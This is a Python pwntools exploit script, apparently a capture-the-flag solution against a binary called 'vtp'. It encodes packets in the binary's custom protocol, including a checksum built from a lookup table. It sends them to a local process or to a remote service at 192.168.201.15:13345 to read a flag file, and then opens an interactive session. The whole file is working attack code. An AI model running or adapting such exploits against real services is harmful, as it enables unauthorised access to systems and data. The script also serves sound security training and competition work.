#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./vtp"
elf=ELF(pwn_file)

with open("./bin","r") as f:
    tmp=f.read()
    table =[ u64(tmp[i:i+8]) for i in range(0,len(tmp),8)]

def hash(s,seed=0):
    p=seed^0xFFFFFFFF
    for i in range(len(s)):
        p= (p>>8)^table[(p^ord(s[i]))&0xff]
    return p32(p^0xffffffff)[::-1]

def get_opcode_unit(N,endian=0):
        s=chr(3<<5|4|(endian<<4))
        if endian==0:
            s+=p32(N)
        else:
            s+=p32(N)[::-1]
        return s

def get_type2_unit(data):
    s="\x02"
    s+=data+"\x00"
    return s

def get_type3_1_unit(size,data):
    assert size <0x10
    s=chr(3|size<<4)
    s+=data
    return s

def get_type3_2_unit(size,data):
    s=chr(3|1<<3|4<<4)
    s+=p32(size)
    s+=data
    return s

def vtp_encode(data):
    s="\xDD"
    s+=p32(len(data))[::-1]+data+hash(data)
    return s

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("192.168.201.15",13345)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


payload=vtp_encode(get_opcode_unit(0x1)+get_type2_unit("here_is_your_flag")+get_type3_2_unit(0x10,p64(0xc1f9ed86bd2860ec)+p64(0x30be0f249f95792d)))
conn.send(payload)
payload=vtp_encode(get_opcode_unit(0xb)+get_type2_unit("here_is_your_flag/flag"))
debug()
conn.send(payload)

conn.interactive()









